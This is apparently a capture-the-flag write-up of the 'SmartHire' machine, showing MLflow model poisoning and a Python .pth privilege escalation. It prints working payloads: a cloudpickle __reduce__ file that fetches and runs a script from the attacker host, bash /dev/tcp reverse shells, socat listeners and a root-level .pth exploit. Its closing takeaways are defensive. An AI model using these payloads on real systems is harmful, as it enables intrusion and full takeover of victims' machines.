// 01

Machine Overview

SmartHire is a Flask-based hiring platform backed by an MLflow model registry. The attack chain abuses two misconfigurations: a default admin:password credential on the MLflow instance enables artifact poisoning — replacing the production python_model.pkl with a malicious cloudpickle payload that executes on the next /predict call. For root, a group-writable plugin directory in a sudo-privileged Python script allows a .pth file to execute arbitrary code during Python site initialization as root.

CVE-2023-6018 / CWE-502
MLflow Artifact Poisoning
Unauthenticated (or weakly authenticated) MLflow allows overwriting model artifacts. cloudpickle deserialization on load triggers __reduce__ → OS command execution
CWE-276 / CWE-798
Writable Plugin Dir + Weak Creds
Group-writable plugins/ directory in sudo-privileged Python script. site.addsitedir() executes .pth import lines as root during site initialization
◈
Full Attack Chain: vhost discovery → models.smarthire.htb (MLflow Basic Auth) → admin:password brute-force → locate production model run → overwrite python_model.pkl with malicious cloudpickle → create new model version → trigger /predict → reverse shell as svcweb → sudo mlflowctl.py → .pth in writable dev/ directory → site.addsitedir() executes as root → root shell.

RCE — cloudpickle Deserialization

05
Craft Malicious python_model.pkl
RCE · Phase 05

Python's pickle (and cloudpickle) execute the __reduce__ method of any class during deserialization. By defining __reduce__ to return (os.system, (cmd,)), the OS command runs the instant cloudpickle.load() processes the file. The payload downloads a reverse shell script from Kali and executes it.

python3 — generate malicious pkl
import cloudpickle, os

class Payload:
    def __reduce__(self):
        return (os.system, (
            'curl http://10.10.14.6:8000/shell > /tmp/s.sh && bash /tmp/s.sh',
        ))

with open('/tmp/python_model.pkl', 'wb') as f:
    cloudpickle.dump(Payload(), f)
python3 — attacker Flask server (serves reverse shell)
from flask import Flask
app = Flask(__name__)

@app.route("/shell")
def shell():
    return ("#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.6/4444 0>&1\n", 200)

if __name__ == "__main__":
    app.run("0.0.0.0", 8000)
bash — socat PTY listener
socat PTY,link=/tmp/rev_pty,raw,echo=0 TCP-LISTEN:4444,reuseaddr &

PrivEsc — Python .pth Execution via sudo mlflowctl.py

09
sudo Enumeration & mlflowctl.py Analysis
PrivEsc · Phase 09

The svcweb account has a single sudo rule: run mlflowctl.py with any arguments as root, no password. The script implements a plugin architecture — it calls site.addsitedir() on every subdirectory of plugins/, then imports modules from those directories.

bash
sudo -l
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
python3 — mlflowctl.py key logic
from pathlib import Path
import site

BASE_DIR    = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# Adds every plugin subdirectory to sys.path via site.addsitedir()
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))   ← processes .pth files!

def main():
    import mlflow_actions, backup_models  # loaded from plugin dirs
✕
Python .pth File Execution: site.addsitedir() processes every .pth file in the added directory. Lines beginning with import are executed as live Python code during site path initialization — before any application logic runs. Since the script executes as root via sudo, any code in a .pth file runs with root privileges.
10
Writable dev/ Directory — devs Group
PrivEsc · Phase 10

The plugins/dev/ directory is group-writable (drwxrwxr-x) and owned by the devs group. svcweb is in the devs group — granting write access to drop arbitrary files into the directory that mlflowctl.py will process as root.

bash — check directory permissions
ls -la /opt/tools/mlflow_ctl/plugins/
drwxr-xr-x root root    plugins/
drwxrwxr-x root devs    plugins/dev/   ← group-writable (devs)
⚠
CWE-276 Incorrect Default Permissions: A group-writable directory in the execution path of a sudo-privileged script is equivalent to an unconditional root backdoor for any member of that group. The devs group was likely intended for development convenience — but creates a direct privilege escalation path.
11
Deploy .pth Payload & Trigger Root Shell
PrivEsc · Phase 11

Write a malicious .pth file to plugins/dev/. The single line begins with import, which Python's site module executes literally. When sudo mlflowctl.py runs, site.addsitedir("plugins/dev") processes the file, executes the import line as root, and the reverse shell fires before any application logic.

bash — create and deploy malicious .pth
# Step 1: write malicious .pth file
echo 'import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.6/4445 0>&1\"")' \
  > /tmp/exploit.pth

# Step 2: drop into writable dev directory
cp /tmp/exploit.pth /opt/tools/mlflow_ctl/plugins/dev/

# Step 3: start root shell listener
socat PTY,link=/tmp/root_pty,raw,echo=0 TCP-LISTEN:4445,reuseaddr &

# Step 4: trigger sudo execution
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
output — root shell received
connect to [10.10.14.6] from [10.129.85.125]:46180
root@smarthire:/var/www/smarthire.htb# id
uid=0(root) gid=0(root) groups=0(root)
✓
Root Shell via .pth Execution: site.addsitedir() processed exploit.pth, executed the import os; os.system(...) line as root before any application logic, and the reverse shell connected.

key takeaways
// 01
Pickle Deserialization Is Arbitrary Code Execution
Any application that calls pickle.load() or cloudpickle.load() on attacker-controlled data is equivalent to eval(). Model artifacts must use safe serialization formats (ONNX, safetensors, JSON) or be cryptographically signed and verified before loading. Never deserialize PKL files from a registry that allows unauthenticated or weakly authenticated writes.
// 02
MLflow Default Credentials Enable Full Artifact Poisoning
The default admin:password credential on MLflow gave complete write access to every model artifact. ML infrastructure must enforce strong credentials, network-level isolation (VPN or service mesh), and immutable artifact storage — model artifacts should be write-once after training with cryptographic attestation.
// 03
site.addsitedir() in sudo-Privileged Scripts Is a Root Backdoor
Python's site.addsitedir() executes import lines in .pth files as live Python code. Any directory added this way must be root-owned with no write access for non-root users. Sudo rules that invoke Python scripts with plugin architectures must be treated with the same scrutiny as direct NOPASSWD root shells.
// 04
Group-Writable Directories in Privilege Paths Are Instant Escalation
The devs group membership became a root escalation path because the group had write access to a directory processed by a sudo-privileged script. All directories in the execution path of any privileged binary must be root-owned, root-writable only, and audited as part of the sudo rule review.
// 05
Sudo Wildcards (*) Should Always Be Reviewed as Full Root Access
The sudo rule mlflowctl.py * allows any argument — but the real danger was the script's internal logic, not the arguments. Any sudo rule permitting a script with dynamic imports, plugin loading, or filesystem operations should be treated as equivalent to an unrestricted root shell until proven otherwise through a full code review.
// 06
ML Pipelines Are Production Attack Surface
Model registries, training pipelines, and prediction services handle code that executes in production. Security controls applied to web application deployments — authentication, authorization, network isolation, input validation, immutable artefacts — must be applied with equal rigour to all ML infrastructure components.
